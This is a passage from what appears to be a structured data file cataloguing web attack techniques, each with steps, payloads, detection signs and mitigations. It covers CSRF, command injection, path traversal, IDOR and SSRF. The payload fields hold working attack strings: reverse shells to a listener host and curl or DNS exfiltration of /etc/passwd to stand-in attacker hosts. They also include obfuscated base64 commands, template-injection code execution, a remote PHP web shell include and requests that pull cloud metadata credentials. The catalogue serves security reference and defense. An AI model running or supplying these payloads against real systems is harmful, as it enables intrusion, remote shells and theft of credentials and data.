        "desc": "Bypassing CSRF protections by sending requests with JSON Content-Type when the server accepts it without strict validation.",
        "steps": "1. Identify JSON API endpoint accepting POST/PUT without CSRF token\n2. Test if server validates Content-Type: send `application/json` vs `text/plain`\n3. Craft exploit: `fetch('/api/action', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:'delete'}), credentials:'include'})`\n4. If CORS allows: exploit from any origin with `Access-Control-Allow-Credentials: true`\n5. If X-Requested-With missing: use form-based submission with text/plain encoding",
        "payloads": [
            "`fetch('/api/action', {method:'POST', headers:{'Content-Type':'application/json'}, credentials:'include', body:JSON.stringify({action:'exploit'})})`",
            "`<form action='/api/action' method='POST' enctype='text/plain'><textarea name='{\"action\":\"exploit\"}'>`",
            "`var xhr=new XMLHttpRequest();xhr.open('POST','/api/action');xhr.withCredentials=true;xhr.setRequestHeader('Content-Type','application/json');xhr.send(JSON.stringify({action:'exploit'}));`",
        ],
        "detection": [
            "JSON API endpoints lacking CSRF token validation",
            "Accepting text/plain Content-Type for JSON endpoints",
            "Missing Origin/Referer validation",
            "CORS misconfiguration allowing credential requests",
        ],
        "mitigations": [
            "Require CSRF tokens in custom headers for JSON APIs",
            "Strict Content-Type validation (reject text/plain on JSON endpoints)",
            "Validate Origin and Referer headers",
            "SameSite=Strict cookie attribute",
        ],
    },
    {
        "category": "csrf",
        "mitre_ids": ["T1534"],
        "name": "CSRF via WebSocket",
        "desc": "Performing CSRF attacks through WebSocket connections that bypass traditional HTTP-based CSRF protections.",
        "steps": "1. Identify WebSocket endpoint: `ws://target/ws` or `wss://target/ws`\n2. Test if WebSocket connection requires authentication (cookie-based)\n3. Open cross-origin WebSocket: `new WebSocket('wss://target/ws')` (cookies sent automatically)\n4. Send malicious message: `ws.send(JSON.stringify({action:'delete_account'}))`\n5. Exploit: host page that opens WebSocket and sends commands",
        "payloads": [
            "`var ws=new WebSocket('wss://target/ws');ws.onopen=function(){ws.send(JSON.stringify({action:'exploit'}))};`",
            "`new WebSocket('wss://target/ws').send('malicious_data')`",
            "`<script>var ws=new WebSocket('wss://target/ws');ws.onopen=()=>ws.send('CMD');</script>`",
        ],
        "detection": [
            "WebSocket endpoints without origin validation",
            "Cross-origin WebSocket connections in logs",
            "Missing CSRF token in WebSocket handshake or messages",
            "Cookie-based auth on WebSocket without origin check",
        ],
        "mitigations": [
            "Validate Origin header on WebSocket connections",
            "CSRF tokens in WebSocket handshake or first message",
            "SameSite cookie restrictions",
            "Rate limiting on WebSocket message frequency",
        ],
    },
    {
        "category": "csrf",
        "mitre_ids": ["T1534"],
        "name": "Login CSRF",
        "desc": "Forcing a victim to log into an attacker-controlled account, enabling tracking of victim activity.",
        "steps": "1. Create attacker account on target: `username: attacker_tracked, password: known`\n2. Craft login CSRF: `<form action='https://target/login' method='POST'><input name='username' value='attacker_tracked'><input name='password' value='known'><script>document.forms[0].submit()</script></form>`\n3. Victim logs into attacker's account unknowingly\n4. Attacker monitors account activity: all victim actions are under attacker's account\n5. Data exfiltration: victim uploads files, enters data into attacker-controlled account",
        "payloads": [
            "`<form action='https://target/login' method='POST'><input name='username' value='attacker'><input name='password' value='attacker_pass'><script>document.forms[0].submit()</script></form>`",
            "`fetch('https://target/login', {method:'POST', credentials:'include', body:'username=attacker&password=pass'})`",
        ],
        "detection": [
            "Login endpoints without CSRF protection",
            "Multiple accounts accessed from the same login flow",
            "Session fixation patterns after forced login",
            "Unusual account switching patterns",
        ],
        "mitigations": [
            "CSRF tokens on login forms",
            "SameSite=Strict on session cookies",
            "Re-authentication prompts after login",
            "Notify users of successful login via secondary channel",
        ],
    },
    {
        "category": "csrf",
        "mitre_ids": ["T1534"],
        "name": "CSRF with SameSite Cookie Bypass",
        "desc": "Bypassing SameSite cookie restrictions through browser-specific behaviors, redirects, or Lax allowlist tricks.",
        "steps": "1. Check SameSite cookie attribute: `Set-Cookie: session=abc; SameSite=Lax`\n2. Lax allows GET with top-level navigation: craft GET CSRF via `<a href='https://target/action?param=value'>Click</a>`\n3. Exploit redirect chain: `https://attacker/redirect?url=https://target/action` (some browsers allow Lax cookies on redirects)\n4. Use form GET method for state changes if server accepts it\n5. Exploit 2-minute Lax allowlist (Chrome): new cookies sent on POST within 2 minutes of creation",
        "payloads": [
            "`<a href='https://target/action?param=value'>Click</a>` (top-level GET navigation, Lax cookies sent)",
            "`<meta http-equiv='refresh' content='0;url=https://target/action?param=value'>`",
            "`https://attacker/redirect?url=https://target/action` (redirect bypass)",
            "`<form action='https://target/action' method='GET'><script>document.forms[0].submit()</script></form>`",
        ],
        "detection": [
            "SameSite=Lax cookies on state-changing GET endpoints",
            "Top-level navigation CSRF via link clicks",
            "Redirect-based cookie bypass attempts",
            "GET endpoints performing state changes",
        ],
        "mitigations": [
            "Use SameSite=Strict for sensitive cookies",
            "Never allow state changes via GET requests",
            "CSRF tokens as defense-in-depth beyond SameSite",
            "Validate Origin/Referer on state-changing requests",
            "Monitor for top-level navigation attack patterns",
        ],
    },
    {
        "category": "command_injection",
        "mitre_ids": ["T1059.004"],
        "name": "OS Command Injection",
        "desc": "Injecting operating system commands through vulnerable web application inputs.",
        "steps": "1. Identify command injection point: test `; id` or `| whoami` in input fields\n2. Confirm execution: `127.0.0.1; whoami` or `127.0.0.1|id`\n3. Blind confirmation: `127.0.0.1; sleep 5` (check response time)\n4. Data exfiltration: `127.0.0.1; curl http://attacker/$(whoami)`\n5. Reverse shell: `127.0.0.1; bash -i >& /dev/tcp/attacker/4444 0>&1`",
        "payloads": [
            "`; whoami`",
            "`| id`",
            "`$(whoami)`",
            "`; curl http://attacker/$(cat /etc/passwd | base64)`",
            "`; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`",
            "`\n/bin/nc -e /bin/bash 10.0.0.1 4444`",
        ],
        "detection": [
            "Unexpected command output in responses",
            "Time delays matching injected SLEEP/SLEEP commands",
            "Out-of-band DNS/HTTP callbacks",
            "Unexpected process execution on server",
        ],
        "mitigations": [
            "Input validation and whitelisting",
            "Avoid shell execution functions (system, exec, popen)",
            "Use language-native libraries instead of shell commands",
            "Principle of least privilege for web server process",
        ],
    },
    {
        "category": "command_injection",
        "mitre_ids": ["T1059.004"],
        "name": "Blind Command Injection",
        "desc": "Command injection where output is not visible in the response.",
        "steps": "1. Test time-based: `127.0.0.1; sleep 5` — observe 5-second delay\n2. DNS exfiltration: `127.0.0.1; nslookup $(whoami).attacker.com`\n3. HTTP exfiltration: `127.0.0.1; curl http://attacker/$(whoami)`\n4. File write: `127.0.0.1; echo 'pwned' > /tmp/pwned.txt`\n5. Automate with commix: `commix --url='http://target/page?ip=127.0.0.1' --blind`",
        "payloads": [
            "`; sleep 5`",
            "`; nslookup $(whoami).attacker.dnslog.site`",
            "`; curl http://attacker/$(cat /etc/passwd|base64)`",
            "`; ping -c 3 attacker`",
        ],
        "detection": [
            "Unexpected outbound DNS queries",
            "Out-of-band HTTP callbacks",
            "Response time anomalies",
            "Unexpected file creation on server",
        ],
        "mitigations": [
            "Input validation",
            "WAF command injection rules",
            "Outbound network restrictions",
            "Process execution monitoring",
        ],
    },
    {
        "category": "command_injection",
        "mitre_ids": ["T1059.004"],
        "name": "Command Injection via HTTP Headers",
        "desc": "Injecting OS commands through HTTP request headers that are unsafely passed to shell commands.",
        "steps": "1. Test User-Agent: `User-Agent: ; curl http://attacker/$(whoami)`\n2. Test Referer: `Referer: http://x; cat /etc/passwd`\n3. Test X-Forwarded-For: `X-Forwarded-For: 127.0.0.1; id`\n4. Test Cookie: `Cookie: session=abc; bash -c 'id'`\n5. Test custom headers used in logging/analytics scripts",
        "payloads": [
            "`User-Agent: ; curl http://attacker/$(whoami)`",
            "`Referer: ; cat /etc/passwd`",
            "`X-Forwarded-For: 127.0.0.1; id`",
            "`Cookie: session=abc; bash -c 'id'`",
        ],
        "detection": [
            "Shell metacharacters in HTTP headers",
            "Command output in HTTP responses or logs",
            "Out-of-band callbacks triggered by header values",
            "Unexpected processes spawned from web server",
        ],
        "mitigations": [
            "Sanitize all HTTP header values before shell usage",
            "Avoid passing headers to system/exec calls",
            "WAF header inspection for command patterns",
            "Use language-native logging libraries",
        ],
    },
    {
        "category": "command_injection",
        "mitre_ids": ["T1059.004"],
        "name": "Command Injection with Filter Evasion (Base64, Hex)",
        "desc": "Bypassing command injection filters using encoding techniques like base64 and hex representation.",
        "steps": "1. Test base64 encoding: `echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | bash` (decodes to `cat /etc/passwd`)\n2. Hex encoding: `$(printf '\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64')`\n3. Octal: `$(printf '\\143\\141\\164\\040\\057\\145\\164\\143\\057\\160\\141\\163\\163\\167\\144')`\n4. Character substitution: `c'a't /e't'c/passwd` (bash globbing)\n5. Variable concatenation: `a=c;b=at;c=/e;c=$c tc/p$d;$a$b $c`",
        "payloads": [
            "`echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | bash`",
            "`$(printf '\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64')`",
            "`c'a't /e't'c/passwd`",
            "`$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh)`",
        ],
        "detection": [
            "Base64/hex encoded content in parameters that are passed to shell",
            "Printf with hex/octal escape sequences",
            "Unusual quoting patterns in parameters (c'a't)",
            "Variable concatenation patterns in input",
        ],
        "mitigations": [
            "Input validation rejecting all shell metacharacters",
            "Decode and inspect input before processing",
            "Use allowlists for permitted characters",
            "Avoid shell execution entirely when possible",
        ],
    },
    {
        "category": "command_injection",
        "mitre_ids": ["T1059.004"],
        "name": "Command Injection in File Upload Filename",
        "desc": "Injecting OS commands through filenames of uploaded files that are unsafely processed by the server.",
        "steps": "1. Test filename injection: upload file named `test;whoami.txt`\n2. Test backtick injection: filename `test$(whoami).txt`\n3. Test newline injection: filename `test\\nid\\n.txt`\n4. Exploit processing: if server runs `file <filename>` or `convert <filename>`, injection executes\n5. Test in metadata: EXIF data fields processed by image tools",
        "payloads": [
            "`test;whoami.txt` (semicolon injection)",
            "`test$(whoami).txt` (command substitution)",
            "`test`id`.txt` (backtick execution)",
            "`test\\ncurl http://attacker/shell.sh|sh.txt` (newline injection)",
        ],
        "detection": [
            "Shell metacharacters in uploaded filenames",
            "Unexpected processes spawned during file processing",
            "Out-of-band callbacks from file processing services",
            "Error messages revealing command execution",
        ],
        "mitigations": [
            "Rename uploaded files with safe random names",
            "Sanitize filenames before any processing",
            "Use language-native file handling APIs",
            "Sandbox file processing in isolated containers",
        ],
    },
    {
        "category": "command_injection",
        "mitre_ids": ["T1059.004"],
        "name": "Command Injection via Server-Side Template Injection",
        "desc": "Achieving remote code execution through template engines that allow calling OS commands.",
        "steps": "1. Detect SSTI: `{{7*7}}` → `49` confirms template evaluation\n2. Identify engine: `{{config}}` (Jinja2), `${7*7}` (Freemarker)\n3. Jinja2 RCE: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`\n4. Twig RCE: `{{['id']|filter('system')}}`\n5. Freemarker RCE: `<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}`",
        "payloads": [
            "`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` (Jinja2)",
            "`{{['id']|filter('system')}}` (Twig)",
            '`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` (Freemarker)',
            "`{{''.__class__.__mro__[1].__subclasses__()}}` (Python class traversal)",
        ],
        "detection": [
            "Template syntax in user input ({{, ${, <%)",
            "Arithmetic evaluation in responses",
            "OS command output in rendered templates",
            "Template engine error messages with class/globals info",
        ],
        "mitigations": [
            "Use sandboxed template environments",
            "Never pass user input directly to template evaluation",
            "Restrict available methods and modules in template context",
            "Input validation against template syntax",
        ],
    },
    {
        "category": "path_traversal",
        "mitre_ids": ["T1083"],
        "name": "Directory Traversal",
        "desc": "Accessing files outside the intended directory using path manipulation.",
        "steps": "1. Test for traversal: `../../../etc/passwd` or `..\\..\\..\\windows\\system32\\config\\sam`\n2. Identify readable files: try `/etc/passwd` (Linux) or `C:\\Windows\\win.ini` (Windows)\n3. Bypass encoding: `....//....//etc/passwd`, `%2e%2e%2f`, `..%252f..%252f`\n4. Null byte injection (older systems): `../../../etc/passwd%00.jpg`\n5. Source code access: `../../../var/www/html/config.php`",
        "payloads": [
            "`../../../etc/passwd`",
            "`..\\..\\..\\windows\\system32\\config\\sam`",
            "`....//....//etc/passwd`",
            "`%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`",
            "`/proc/self/environ`",
        ],
        "detection": [
            "Unexpected file paths in request parameters",
            "Error messages revealing absolute paths",
            "Sensitive file content in responses",
            "Path normalization bypass attempts",
        ],
        "mitigations": [
            "Path validation and canonicalization",
            "Chroot or restricted file access",
            "Avoid passing user input to file operations",
            "Web Application Firewall path traversal rules",
        ],
    },
    {
        "category": "path_traversal",
        "mitre_ids": ["T1083"],
        "name": "Local File Inclusion (LFI)",
        "desc": "Including local files through vulnerable include mechanisms.",
        "steps": "1. Test parameter: `?page=../../../etc/passwd`\n2. PHP wrappers: `?page=php://filter/convert.base64-encode/resource=index.php`\n3. PHP input wrapper: `?page=php://input` with POST data `<?php system('id'); ?>`\n4. Log poisoning: inject PHP code into access logs, then include: `?page=/var/log/apache2/access.log`\n5. Session file inclusion: `?page=/tmp/sess_<session_id>`",
        "payloads": [
            "`?page=../../../etc/passwd`",
            "`?page=php://filter/convert.base64-encode/resource=config.php`",
            "`?page=php://input` (POST: `<?php system('id'); ?>`)",
            "`?page=/var/log/apache2/access.log` (with poisoned User-Agent)",
        ],
        "detection": [
            "File path patterns in URL parameters",
            "PHP wrapper usage in requests",
            "Unexpected file content in responses",
            "Base64 encoded content in responses",
        ],
        "mitigations": [
            "Whitelist allowed files",
            "Disable PHP wrappers in production",
            "Prevent log poisoning (sanitized logs)",
            "Open_basedir restriction",
        ],
    },
    {
        "category": "path_traversal",
        "mitre_ids": ["T1083"],
        "name": "Path Traversal with URL Encoding Double Encoding",
        "desc": "Bypassing path traversal filters using double URL encoding to evade WAFs and normalization.",
        "steps": "1. Test single encoding: `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`\n2. Test double encoding: `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd`\n3. Double-dot double encoding: `..%252f..%252f..%252fetc%252fpasswd`\n4. Mixed encoding: `%2e%2e%252f%2e%2e%252fetc%252fpasswd`\n5. Over-encoding: `%252e%252e%252f` decoded twice → `../`",
        "payloads": [
            "`%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd`",
            "`..%252f..%252f..%252fetc%252fpasswd`",
            "`%2e%2e%252f%2e%2e%252fetc%252fpasswd`",
            "`%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd`",
        ],
        "detection": [
            "Double-encoded path traversal sequences in requests",
            "Multiple decode passes on same parameter",
            "WAF evasion patterns with %25 prefix",
            "Request normalization inconsistencies between WAF and application",
        ],
        "mitigations": [
            "Decode input fully before validation",
            "Canonicalize paths after all decoding",
            "Reject requests containing encoded traversal sequences",
            "Use framework-provided path resolution",
        ],
    },
    {
        "category": "path_traversal",
        "mitre_ids": ["T1083"],
        "name": "Path Traversal in Java (Spring Path Variable)",
        "desc": "Exploiting Spring MVC @PathVariable traversal via encoded path segments that bypass normalization.",
        "steps": "1. Test Spring path variable: `GET /api/files/..%2f..%2f..%2fetc%2fpasswd`\n2. Exploit URL decoding: Spring decodes path variables, `..%2f` becomes `../`\n3. Test null byte: `GET /api/files/..%2f..%2fetc%2fpasswd%00.txt`\n4. Test with SecurityContext bypass: `GET /api/files/%2e%2e/%2e%2e/etc/passwd`\n5. Test Spring ResourceHandler: `GET /static/../../../etc/passwd`",
        "payloads": [
            "`GET /api/files/..%2f..%2f..%2fetc%2fpasswd`",
            "`GET /api/files/%2e%2e/%2e%2e/etc/passwd`",
            "`GET /static/../../../etc/passwd`",
            "`GET /api/download?file=..%2f..%2fetc%2fpasswd`",
        ],
        "detection": [
            "Encoded traversal sequences in Spring path variables",
            "Access to files outside configured resource directories",
            "Spring error messages revealing file paths",
            "Unexpected file content in API responses",
        ],
        "mitigations": [
            "Use ResourceHandler with strict path checking",
            "Spring Security URL authorization",
            "Validate resolved paths against allowed base directory",
            "Disable path traversal in DispatcherServlet configuration",
        ],
    },
    {
        "category": "path_traversal",
        "mitre_ids": ["T1083"],
        "name": "Path Traversal in Node.js",
        "desc": "Exploiting path traversal vulnerabilities in Node.js applications using improper path.join or express.static misconfiguration.",
        "steps": "1. Test Express static: `GET /../../../etc/passwd` with encoded dots\n2. Test path.join: `path.join('/app/public', '../../etc/passwd')` may escape public dir\n3. Test res.sendFile: `res.sendFile(req.query.file)` without validation\n4. Test __dirname misuse: `res.sendFile(__dirname + '/' + req.params.file)`\n5. Test with URL encoding: `GET /%2e%2e/%2e%2e/etc/passwd`",
        "payloads": [
            "`GET /../../../etc/passwd`",
            "`GET /%2e%2e/%2e%2e/etc/passwd`",
            "`GET /static/..%2f..%2f..%2fetc%2fpasswd`",
            "`?file=../../etc/passwd` (for res.sendFile)",
        ],
        "detection": [
            "Traversal sequences in Express route parameters",
            "Files served outside static directory",
            "path.join resolving outside intended base",
            "Unexpected file content in HTTP responses",
        ],
        "mitigations": [
            "Use path.resolve() and check against base directory",
            "Serve static files with express.static root option only",
            "Validate resolved paths: `if (!resolved.startsWith(baseDir)) return 403`",
            "Use sanitize-filename or similar library",
        ],
    },
    {
        "category": "path_traversal",
        "mitre_ids": ["T1083"],
        "name": "Remote File Inclusion (RFI)",
        "desc": "Including remote files via vulnerable include mechanisms, enabling remote code execution.",
        "steps": "1. Test include parameter: `?page=http://attacker.com/shell.php`\n2. Host malicious file: `<?php system($_GET['cmd']); ?>` on attacker server\n3. PHP wrapper RFI: `?page=php://filter/convert.base64-encode/resource=http://attacker/payload`\n4. Test allow_url_include: check `phpinfo()` for `allow_url_include = On`\n5. Escalate to RCE: included file executes as PHP on the target server",
        "payloads": [
            "`?page=http://attacker.com/shell.php`",
            "`?page=http://attacker.com/shell.txt` (non-.php extension to bypass filter)",
            "`?page=ftp://attacker.com/payload.php`",
            "`?page=php://filter/convert.base64-encode/resource=http://attacker/config`",
        ],
        "detection": [
            "Remote URLs in include/file parameters",
            "allow_url_include enabled in PHP configuration",
            "Network connections to external hosts from web server",
            "Unexpected code execution from included remote files",
        ],
        "mitigations": [
            "Disable allow_url_include and allow_url_fopen in php.ini",
            "Whitelist local files only",
            "Disable PHP wrappers in production",
            "Network egress filtering on web server",
            "Use autoloader instead of dynamic includes",
        ],
    },
    {
        "category": "path_traversal",
        "mitre_ids": ["T1083"],
        "name": "Path Traversal with Symlinks",
        "desc": "Exploiting symbolic links to bypass directory restrictions and access files outside the intended scope.",
        "steps": "1. Test symlink in upload: upload a .zip containing symlink to `/etc/passwd`\n2. Test symlink in extracted archives: create symlink `link -> /etc/passwd` in tar/zip\n3. Test race condition: create symlink between path check and file read (TOCTOU)\n4. Test NFS mount symlinks: symlinks pointing to NFS-mounted sensitive directories\n5. Test Docker volume symlinks: symlink from mounted volume to host filesystem",
        "payloads": [
            "`ln -s /etc/passwd symlink && zip --symlinks exploit.zip symlink` (symlink in zip)",
            "`tar cf exploit.tar -C / etc/passwd && ln -s / symlink` (symlink in tar)",
            "`upload symlink: link -> /etc/shadow` (in uploaded archive)",
        ],
        "detection": [
            "Symlinks in uploaded archives pointing outside allowed directories",
            "Extracted files that are symlinks to sensitive paths",
            "TOCTOU race conditions in file access patterns",
            "Archive extraction creating unexpected symlinks",
        ],
        "mitigations": [
            "Resolve symlinks before file access (os.path.realpath)",
            "Reject symlinks in uploaded archives",
            "Validate resolved paths against base directory after realpath",
            "Use chroot or mount namespaces for file operations",
        ],
    },
    {
        "category": "idor",
        "mitre_ids": ["T1190.001"],
        "name": "Insecure Direct Object Reference",
        "desc": "Accessing unauthorized resources by manipulating object references in requests.",
        "steps": "1. Identify resource identifiers: `GET /api/users/123/profile`\n2. Test sequential IDs: change 123 to 124, 125, etc.\n3. Test UUID predictability: try known UUIDs\n4. Test other object types: `GET /api/invoices/456` when user should only see their invoices\n5. Automate: `for i in $(seq 1 1000); do curl -b 'session=abc' http://target/api/users/$i; done`",
        "payloads": [
            "`GET /api/users/124/profile` (change ID to access other users)",
            "`GET /api/invoices/789` (access another user's invoice)",
            "`POST /api/transfer {from: 123, to: 456, amount: 500}` (transfer from another account)",
            "`DELETE /api/documents/999` (delete another user's document)",
        ],
        "detection": [
            "Sequential ID enumeration",
            "Accessing resources belonging to other users",
            "Missing authorization checks in API endpoints",
            "Mass assignment vulnerabilities",
        ],
        "mitigations": [
            "Authorization checks on every resource access",
            "Use unpredictable identifiers (UUIDs)",
            "Implement role-based access control",
            "API rate limiting",
            "User-context validation",
        ],
    },
    {
        "category": "idor",
        "mitre_ids": ["T1190.001"],
        "name": "IDOR in UUID-Based APIs",
        "desc": "Exploiting IDOR when UUIDs are predictable, leaked, or used across multiple endpoints without proper authorization.",
        "steps": "1. Identify UUID-based endpoints: `GET /api/documents/550e8400-e29b-41d4-a716-446655440000`\n2. Check UUID reuse across endpoints: same UUID in `/api/users/{uuid}` and `/api/reports/{uuid}`\n3. Test UUID enumeration: collect UUIDs from one endpoint, use in another\n4. Test UUID predictability: time-based UUIDs (v1) can be predicted\n5. Test with leaked UUIDs: error messages, logs, URLs may expose UUIDs",
        "payloads": [
            "`GET /api/users/550e8400-e29b-41d4-a716-446655440000/profile` (use leaked UUID)",
            "`GET /api/reports/6ba7b810-9dad-11d1-80b4-00c04fd430c8` (UUID from different endpoint)",
            "`GET /api/documents/{known_uuid_from_other_user}`",
        ],
        "detection": [
            "UUID reuse across unrelated endpoints",
            "UUIDs leaked in error messages or logs",
            "Time-based UUID patterns (v1) enabling prediction",
            "Access to resources using UUIDs from other contexts",
        ],
        "mitigations": [
            "Authorization checks regardless of identifier type",
            "Use UUID v4 (random) not v1 (time-based)",
            "Different UUIDs per endpoint/context",
            "Avoid exposing UUIDs in error messages or URLs",
        ],
    },
    {
        "category": "idor",
        "mitre_ids": ["T1190.001"],
        "name": "IDOR in File Download Endpoints",
        "desc": "Accessing other users' files by manipulating file identifiers in download endpoints.",
        "steps": "1. Identify file download: `GET /api/files/download?file_id=12345`\n2. Enumerate file IDs: try sequential IDs around known file IDs\n3. Test UUID file references: try leaked UUIDs as file identifiers\n4. Test direct file paths: `GET /api/files/download?path=/uploads/other_user_document.pdf`\n5. Test with different file types: receipts, contracts, medical records",
        "payloads": [
            "`GET /api/files/download?file_id=12346` (adjacent file ID)",
            "`GET /api/files/download?path=/uploads/other_user/doc.pdf`",
            "`GET /api/files/550e8400-e29b-41d4-a716-446655440000` (UUID-based)",
            "`GET /api/invoices/download?invoice_id=6789` (different invoice)",
        ],
        "detection": [
            "Sequential file ID enumeration in download requests",
            "Access to files belonging to other users",
            "Missing ownership validation on file endpoints",
            "Multiple file download requests from same session to different IDs",
        ],
        "mitigations": [
            "Validate file ownership before serving downloads",
            "Use signed URLs with expiration for file access",
            "Implement per-user file access control lists",
            "Log and monitor file access patterns",
        ],
    },
    {
        "category": "idor",
        "mitre_ids": ["T1190.001"],
        "name": "IDOR in Email Change",
        "desc": "Changing another user's email address by manipulating user identifiers in account update endpoints.",
        "steps": "1. Identify email change endpoint: `PUT /api/users/{id}/email`\n2. Test with different user IDs: change `id` from own to another user's\n3. Test mass assignment: `PUT /api/profile {email: 'new@email.com', user_id: 456}`\n4. Test in profile update: `POST /api/update-profile {email: 'victim@company.com', target_user_id: 789}`\n5. Verify: check if email was actually changed for the target user",
        "payloads": [
            "`PUT /api/users/456/email {email: 'attacker@evil.com'}` (change other user's email)",
            "`POST /api/update-profile {email: 'attacker@evil.com', user_id: 456}` (mass assignment)",
            "`PUT /api/account {email: 'attacker@evil.com', id: 789}` (parameter tampering)",
        ],
        "detection": [
            "Email change requests for non-session user IDs",
            "Mass assignment with user_id parameter",
            "Parameter tampering in profile update requests",
            "Email change for accounts without proper session validation",
        ],
        "mitigations": [
            "Validate that resource ID matches authenticated user",
            "Require current password for email changes",
            "Send confirmation to both old and new email",
            "Reject extraneous parameters (mass assignment protection)",
        ],
    },
    {
        "category": "idor",
        "mitre_ids": ["T1190.001"],
        "name": "IDOR in Payment/Billing",
        "desc": "Accessing or modifying other users' payment information and billing data through IDOR vulnerabilities.",
        "steps": "1. Identify payment endpoints: `GET /api/billing/{id}`, `GET /api/payments/{id}`\n2. Test sequential billing IDs: access invoices for other users\n3. Test payment method manipulation: `PUT /api/payment-methods/{id}` with another user's ID\n4. Test subscription access: `GET /api/subscriptions/{id}` for other accounts\n5. Test transaction history: `GET /api/transactions?user_id=456`",
        "payloads": [
            "`GET /api/billing/12345` (access other user's billing info)",
            "`PUT /api/payment-methods/6789 {card_number: '4111...'}` (modify payment)",
            "`GET /api/transactions?account_id=456` (view other's transactions)",
            "`DELETE /api/subscriptions/999` (cancel other user's subscription)",
        ],
        "detection": [
            "Access to billing data for non-authenticated user",
            "Sequential billing/invoice ID access patterns",
            "Payment method modifications for other accounts",
            "Transaction history access without ownership check",
        ],
        "mitigations": [
            "Strict authorization on all financial endpoints",
            "Require re-authentication for payment changes",
            "Audit logging for all payment/billing access",
            "Use one-time tokens for sensitive financial operations",
        ],
    },
    {
        "category": "idor",
        "mitre_ids": ["T1190.001"],
        "name": "IDOR in Admin Panel",
        "desc": "Accessing administrative functions and data through IDOR by manipulating admin-level object references.",
        "steps": "1. Identify admin endpoints: `GET /admin/users/{id}`, `GET /api/admin/config`\n2. Test role escalation: `GET /api/users/{id}?role=admin`\n3. Test admin API with regular user session: `GET /admin/dashboard` with standard cookies\n4. Test IDOR to admin objects: `GET /api/users/{admin_id}/settings`\n5. Test mass assignment: `PUT /api/profile {role: 'admin'}`",
        "payloads": [
            "`GET /admin/users/1` (admin panel with regular session)",
            "`PUT /api/profile {role: 'admin'}` (mass assignment role escalation)",
            "`GET /api/users/1/settings` (access admin user's settings)",
            "`POST /api/admin/users {username: 'attacker', role: 'admin'}` (create admin)",
        ],
        "detection": [
            "Non-admin users accessing admin endpoints",
            "Role parameter manipulation in requests",
            "Admin panel access without proper authorization",
            "Mass assignment with role/is_admin parameters",
        ],
        "mitigations": [
            "Server-side role verification on all admin endpoints",
            "Separate admin and user authentication contexts",
            "Whitelist allowed fields in update endpoints",
            "Rate limiting and anomaly detection on admin APIs",
        ],
    },
    {
        "category": "ssrf",
        "mitre_ids": ["T1071.001"],
        "name": "Server-Side Request Forgery",
        "desc": "Forcing the server to make requests to unintended locations.",
        "steps": "1. Identify SSRF point: URL parameters, file imports, image processors\n2. Test internal access: `?url=http://127.0.0.1:80/admin`\n3. AWS metadata: `?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`\n4. Cloud metadata: `?url=http://metadata.google.internal/computeMetadata/v1/`\n5. Port scan: `?url=http://10.0.0.1:PORT` for common ports",
        "payloads": [
            "`http://127.0.0.1:80/admin`",
            "`http://169.254.169.254/latest/meta-data/iam/security-credentials/`",
            "`http://metadata.google.internal/computeMetadata/v1/`",
            "`http://10.0.0.1:22/` (port scan)",
            "`dict://127.0.0.1:6379/INFO` (Redis)",
        ],
        "detection": [
            "Internal IP addresses in URL parameters",
            "Requests to cloud metadata endpoints",
            "Unexpected outbound connections from server",
            "URL redirection to internal resources",
        ],
        "mitigations": [
            "URL allowlisting",
            "Block private IP ranges and metadata endpoints",
            "Network segmentation",
            "Disable unnecessary URL schemes (file://, dict://, gopher://)",
            "Use dedicated outbound proxy",
        ],
    },
    {
        "category": "ssrf",
        "mitre_ids": ["T1071.001"],
        "name": "SSRF to Cloud Metadata",
        "desc": "Using SSRF to access cloud provider metadata services for credential theft.",
        "steps": "1. Identify SSRF point in web application\n2. Access AWS IMDSv1: `?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`\n3. Extract temporary credentials: access key, secret key, session token\n4. Configure AWS CLI with stolen credentials: `aws configure set aws_access_key_id <key>`\n5. Escalate: enumerate S3 buckets, EC2 instances, IAM policies",
        "payloads": [
            "`http://169.254.169.254/latest/meta-data/iam/security-credentials/`",
            "`http://169.254.169.254/latest/meta-data/` (AWS)",
            "`http://metadata.google.internal/computeMetadata/v1/` (GCP)",
            "`http://169.254.169.254/metadata/instance?api-version=2021-02-01` (Azure)",
        ],
        "detection": [
            "Requests to 169.254.169.254 from web applications",
            "Cloud metadata endpoint access in logs",
            "Temporary credential usage from unexpected IPs",
            "IMDSv1 vs IMDSv2 request patterns",
        ],
        "mitigations": [
            "IMDSv2 enforcement (AWS)",
            "Block metadata endpoint at network level",
            "Use service mesh sidecars for cloud API access",
            "Network policies preventing pod-to-metadata communication",
        ],
    },
    {
        "category": "ssrf",
        "mitre_ids": ["T1071.001"],
        "name": "SSRF via URL Parsing Tricks (Redirect, DNS Rebinding)",
        "desc": "Bypassing SSRF filters using URL redirects, DNS rebinding, and URL parsing inconsistencies.",
        "steps": "1. Test redirect-based SSRF: `?url=http://evil.com/redirect-to-internal` (attacker server returns 302 to `http://127.0.0.1/admin`)\n2. DNS rebinding: configure DNS for `ssrf.evil.com` → first resolves to public IP (passes filter), then resolves to `127.0.0.1` (SSRF triggered)\n3. URL parsing inconsistencies: `http://evil.com@127.0.0.1/admin` (userinfo bypass)\n4. Fragment-based bypass: `http://allowed.com#@127.0.0.1` (browser vs server parsing)\n5. Test with `0177.0.0.1` (octal) or `0x7f000001` (hex) representation of 127.0.0.1",
        "payloads": [
            "`http://evil.com/redirect` → 302 to `http://127.0.0.1/admin`",
